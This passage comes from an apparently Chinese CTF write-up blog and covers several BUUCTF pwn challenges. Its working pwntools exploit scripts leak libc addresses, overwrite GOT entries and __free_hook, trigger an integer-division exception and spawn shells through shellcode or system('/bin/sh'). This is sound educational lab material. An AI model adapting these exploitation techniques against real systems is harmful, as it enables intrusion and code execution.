class="string">&quot;\0&quot;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">free_hook=p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>])</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">0</span>,p8(puts_got[i])+b<span class="string">&quot;\x00&quot;</span>,p8(free_hook[i]))</span><br><span class="line">system_addr=p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">1</span>,b<span class="string">&quot;\x00&quot;</span>,p8(system_addr[i]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="奇奇怪怪的题目"><a href="#奇奇怪怪的题目" class="headerlink" title="奇奇怪怪的题目"></a>奇奇怪怪的题目</h1><h2 id="综合bypass"><a href="#综合bypass" class="headerlink" title="综合bypass"></a>综合bypass</h2><h3 id="ciscn-2019-final-10"><a href="#ciscn-2019-final-10" class="headerlink" title="ciscn_2019_final_10"></a>ciscn_2019_final_10</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_final_10">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>负数绕过</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842620315-c6fd08d6-f220-4b86-a36a-135fdeae63f5.png#averageHue=%23fdfdfc&clientId=u9d5fd636-f51f-4&from=paste&height=182&id=u0f7e409f&originHeight=227&originWidth=625&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26390&status=done&style=none&taskId=u3607ca24-965c-42d2-977d-57f0ae5ba2c&title=&width=500" alt="image.png"></p>
<p>转化为char是0</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842631215-2941bfae-dbe6-42c4-b7fa-45da1694c98f.png#averageHue=%23fbfbfb&clientId=u9d5fd636-f51f-4&from=paste&height=141&id=u250d8fe8&originHeight=176&originWidth=638&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21827&status=done&style=none&taskId=u7765f989-d06a-4213-8818-5978434c3f1&title=&width=510.4" alt="image.png"></p>
<p>然后double free修改内容</p>
<p>\0\0绕过判断</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842643635-d0ceed4f-2dff-42b8-9e9e-4482d1d8739f.png#averageHue=%23fefefe&clientId=u9d5fd636-f51f-4&from=paste&height=235&id=u91ce574b&originHeight=294&originWidth=715&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26650&status=done&style=none&taskId=ucbe6a2fe-f933-4d63-9176-c7caa51e33b&title=&width=572" alt="image.png"></p>
<p>这里执行完之后修改了第一个指令，但是不影响，已经执行完了，这里rax就是shellcode起始地址</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842653663-7ee8403e-f9a8-4a17-bc76-04fcff8e63d0.png#averageHue=%236f6f6f&clientId=u9d5fd636-f51f-4&from=paste&height=58&id=u0968571c&originHeight=72&originWidth=986&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13106&status=done&style=none&taskId=u735c44c0-0466-457d-a068-3a75d277217&title=&width=788.8" alt="image.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sa(b<span class="string">&quot;&gt; &quot;</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;&gt; &quot;</span>,str(<span class="number">0x80000000</span>-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">add(<span class="number">0x30</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>()</span><br><span class="line"><span class="built_in">free</span>()</span><br><span class="line">add(<span class="number">0x30</span>,b<span class="string">&quot;\x90&quot;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,b<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,b<span class="string">&quot;The cake is a lie!\0&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;&gt; &quot;</span>,b<span class="string">&quot;\x00\x00&quot;</span>+<span class="keyword">asm</span>(shellcraft.sh()))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="itcon-2018-hackergame-2018-calc"><a href="#itcon-2018-hackergame-2018-calc" class="headerlink" title="itcon_2018_hackergame_2018_calc"></a>itcon_2018_hackergame_2018_calc</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#hitcon_2018_hackergame_2018_calc">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>一个比较好玩的题目</p>
<p>异常处理函数这里是个后门，所以我们要触发异常</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842668632-fd3d1bc2-b550-4b02-8184-1a2a6594dde2.png#averageHue=%23fdfdfd&clientId=u9d5fd636-f51f-4&from=paste&height=406&id=u17034aed&originHeight=508&originWidth=1002&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82315&status=done&style=none&taskId=ue84acdf6-190b-4a31-9253-e380eb1d3b4&title=&width=801.6" alt="image.png"></p>
<p>过滤了除0异常，但还有一种异常</p>
<p>2147483648&#x2F;4294967295也就是-0x8000000&#x2F;-1也可以引发异常</p>
<p>触发异常之后绕过sh</p>
<p>我们可以调用vim然后:!sh返回shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sla(b<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, b<span class="string">&quot;2147483648/4294967295&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;examine:\n&quot;</span>, b<span class="string">&quot;vim&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;terminal\n&quot;</span>, b<span class="string">&quot;:!sh&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="ulimit"><a href="#ulimit" class="headerlink" title="ulimit"></a>ulimit</h2><h3 id="pwnable-otp"><a href="#pwnable-otp" class="headerlink" title="pwnable_otp"></a>pwnable_otp</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_otp">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>比较新奇的题目</p>
<p>创建了一个文件，从文件里面读取passwd</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842699289-406544ee-be5d-4c72-b838-3a4cfa5af109.png#averageHue=%23fefefe&clientId=u9d5fd636-f51f-4&from=paste&height=320&id=ua6ff08dc&originHeight=400&originWidth=733&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60844&status=done&style=none&taskId=ufb612dc6-fa69-4362-99df-38e0ccaff5f&title=&width=586.4" alt="image.png"></p>
<p>我们可以先执行ulimit -f 0限制创建文件大小，这样size就是0，从里面读入的就是空</p>
<p>然后执行</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842710686-19018d39-49cc-4c59-80c1-eddfdf18b36c.png#averageHue=%23616161&clientId=u9d5fd636-f51f-4&from=paste&height=154&id=u9cdf304f&originHeight=193&originWidth=736&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35527&status=done&style=none&taskId=u8d8b7c34-b56c-42c8-94b9-0387855efb6&title=&width=588.8" alt="image.png"></p>
<h1 id="解释器"><a href="#解释器" class="headerlink" title="解释器"></a>解释器</h1><h2 id="wdb-2018-final-pwn1"><a href="#wdb-2018-final-pwn1" class="headerlink" title="wdb_2018_final_pwn1"></a>wdb_2018_final_pwn1</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#wdb_2018_final_pwn1">https://buuoj.cn/challenges#wdb_2018_final_pwn1</a><br>解释器，可以覆盖got，exit改为one_gatgeht</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#  -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./wdb_2018_final_pwn1&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;2.27&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#b *$rebase(0xF56) malloc调试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x1205) flag测试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x148B) free</span></span><br><span class="line"><span class="comment"># gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x1199)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># db=gdb.debug(&quot;./server&quot;,gdbscript=gdbscript)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">26113</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    b  *0x400B30</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># def debug_force():</span></span><br><span class="line"><span class="comment">#     global io</span></span><br><span class="line"><span class="comment">#     io.close()</span></span><br><span class="line"><span class="comment">#     gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x145F)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     io=gdb.debug(elf_path,gdbscript=gdbscript)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 0x10</span></span><br><span class="line"><span class="comment">#2 0x38</span></span><br><span class="line"><span class="comment">#3 0x60</span></span><br><span class="line"><span class="comment">#没问题</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;3. Large\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;Enter your item`s name: \n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot; like to remove?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以加0x14</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_to_list</span>(<span class="params">size,num</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;3. Large\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;would you like to add?\n&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;you like to edit?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">b&quot;item`s new name: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def convert_str_asmencode(content: str):</span></span><br><span class="line"><span class="comment">#     out = &quot;&quot;</span></span><br><span class="line"><span class="comment">#     for i in content:</span></span><br><span class="line"><span class="comment">#         out = hex(ord(i))[2:] + out</span></span><br><span class="line"><span class="comment">#     out = &quot;0x&quot; + out</span></span><br><span class="line"><span class="comment">#     return out</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload=<span class="string">b&quot;&lt;&quot;</span>*<span class="number">32</span>+<span class="string">b&quot;.&quot;</span>+<span class="string">b&quot;&gt;.&quot;</span>*<span class="number">5</span>+<span class="string">b&quot;&lt;&quot;</span>*(<span class="number">5</span>+<span class="number">64</span>)+<span class="string">b&quot;,&quot;</span>+<span class="string">b&quot;&gt;,&quot;</span>*<span class="number">5</span>+<span class="string">b&quot;\x00&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;Put the code: &quot;</span>,payload)</span><br><span class="line">libc_base=u64(ru(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\0&quot;</span>))-libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>]</span><br><span class="line">one_gadget_addr=libc_base+one_gadget[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">while</span> one_gadget_addr:</span><br><span class="line">    s(p8(one_gadget_addr&amp;<span class="number">0xff</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    one_gadget_addr=one_gadget_addr&gt;&gt;<span class="number">8</span></span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="pwnable-bf"><a href="#pwnable-bf" class="headerlink" title="pwnable_bf"></a>pwnable_bf</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_bf">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>解析指令做一些操作，不过这里可以覆盖到got表，所以可以劫持控制流</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">payload = (</span><br><span class="line">    b<span class="string">&quot;&lt;&quot;</span> * <span class="number">120</span></span><br><span class="line">    + b<span class="string">&quot;.&gt;.&gt;.&gt;.&quot;</span></span><br><span class="line">    + b<span class="string">&quot;&gt;&quot;</span> * <span class="number">5</span></span><br><span class="line">    + b<span class="string">&quot;,&gt;,&gt;,&gt;,&quot;</span></span><br><span class="line">    + b<span class="string">&quot;&lt;&quot;</span> * <span class="number">7</span></span><br><span class="line">    + b<span class="string">&quot;,&gt;,&gt;,&gt;,&quot;</span></span><br><span class="line">    + b<span class="string">&quot;&lt;&quot;</span> * (<span class="number">3</span> + <span class="number">7</span> * <span class="number">4</span>)</span><br><span class="line">    + b<span class="string">&quot;,&gt;,&gt;,&gt;,&quot;</span></span><br><span class="line">    + b<span class="string">&quot;.&quot;</span></span><br><span class="line">)</span><br><span class="line">sla(b<span class="string">&quot;except [ ]\n&quot;</span>, payload)</span><br><span class="line">addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">    addr += u8(r(<span class="number">1</span>)) &lt;&lt; i * <span class="number">8</span></span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&quot;setvbuf&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i in p32(elf.sym[<span class="string">&quot;main&quot;</span>]):</span><br><span class="line">    s(p8(i))</span><br><span class="line"><span class="keyword">for</span> i in p32(libc.sym[<span class="string">&quot;gets&quot;</span>] + libc_base):</span><br><span class="line">    s(p8(i))</span><br><span class="line"><span class="keyword">for</span> i in p32(libc.sym[<span class="string">&quot;system&quot;</span>] + libc_base):</span><br><span class="line">    s(p8(i))</span><br><span class="line">sl(b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h1><h2 id="elf-set-libc-atexit-elementIO-cleanup"><a href="#elf-set-libc-atexit-elementIO-cleanup" class="headerlink" title="elf_set___libc_atexit_elementIO_cleanup"></a><strong>elf_set___libc_atexit_elementIO_cleanup</strong></h2><h3 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./newest_note&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span></span><br><span class="line">#     one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line"><span class="meta"># <span class="keyword">elif</span> <span class="string">&quot;2.27&quot;</span> in libc.path:</span></span><br><span class="line">#     one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>:</span></span><br><span class="line">#     one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;123.56.111.202&quot;</span></span><br><span class="line">    remote_port =<span class="number">12885</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0x14A4)</span></span><br><span class="line"><span class="string">    b *$rebase(0x14D2)</span></span><br><span class="line"><span class="string">    b *$rebase(0x169B)</span></span><br><span class="line"><span class="string">    b *$rebase(0x13A5)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x4190)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def add(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    sa(b<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;: &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b<span class="string">&quot;: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="meta"># def edit(index,content):</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;enter your command: \n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;Index: \n&quot;</span>,str(index))</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;message: \n&quot;</span>,content)</span></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="meta"># def convert_str_asmencode(content: str):</span></span><br><span class="line"><span class="meta">#     out = <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="meta">#     for i in content:</span></span><br><span class="line"><span class="meta">#         out = hex(ord(i))[2:] + out</span></span><br><span class="line"><span class="meta">#     out = <span class="string">&quot;0x&quot;</span> + out</span></span><br><span class="line"><span class="meta">#     return out</span></span><br><span class="line"></span><br><span class="line">#最高位不能是<span class="number">1</span>，不然就变成负数了</span><br><span class="line">sla(b<span class="string">&quot;notebook will be? :&quot;</span>,str(<span class="number">0x60004200</span>))</span><br><span class="line">show((<span class="number">0x7f119629acf0</span><span class="number">-0x7f119605d010</span>)<span class="comment">//8)</span></span><br><span class="line">ru(b<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))<span class="number">-0x7ff36b130cd0</span>+<span class="number">0x7ff36af18000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    add(i,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        show(<span class="number">0</span>)</span><br><span class="line">   